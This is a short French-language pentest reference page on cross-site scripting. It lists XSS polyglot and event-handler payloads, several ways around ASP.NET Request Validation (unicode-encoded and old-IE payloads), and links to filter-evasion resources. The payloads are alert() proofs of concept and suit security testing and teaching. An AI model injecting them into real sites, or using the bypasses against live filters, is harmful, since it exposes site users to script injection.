---
title: Cross Site Scripting
permalink: /XSS/
---

# Cross-Site Scripting

## Payloads

Les payloads suivants peuvent être utiles:

``` text
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
" onclick=alert(1)//<button ' onclick=alert(1)//>*/alert(1)//
<object data="data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMSk+">
<svg/onload=alert(1)>
```

## ASP.Net

ASP.Net a le mécanisme de "Request Validation" qui bloque de nombreuses tentatives XSS. Globalement tout payload de la forme "<a" (où a est une lettre ou le caractère ! sera bloqué).

Quelques bypass sont possibles:
- Sur les vieilles versions d'IE le payload <#tag
- Si on a une stored il est possible d'injecter un payload en unicode (voir [Bypassing ASP.NET “ValidateRequest” for Stored XSS attacks](https://infosecauditor.wordpress.com/2013/05/27/bypassing-asp-net-validaterequest-for-script-injection-attacks/)). Ceci est dû à une conversion qui est faite par la base de données (les caractères unicodes étant convertis en leur équivalent "standard"): 
``%uff1cscript%uff1ealert('XSS');%uff1c/script%uff1e``
- Sur les vieilles versions de IE et de ASP.net (patch en 2007) le payload suivant marche: ```</XSS STYLE=xss:expression(alert('XSS'))>```

D'autres bypass [Bypassing .Net ValidateRequest](http://www.procheckup.com/media/39734/bypassing-dot-net-validaterequest.pdf)

## Références

- [Master the art of Cross Site Scripting](https://brutelogic.com.br/blog/)
- [XSS without event handlers](https://brutelogic.com.br/blog/xss-without-event-handlers/): pour les situations où les events du type onerror sont bloqués
- [XSS Filter Evasion](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet)
- [PassiveXssScan](https://github.com/jkadijk/burp-plugins): un plugin pour identifier automatiquement les éléments "reflected" dans Burp.
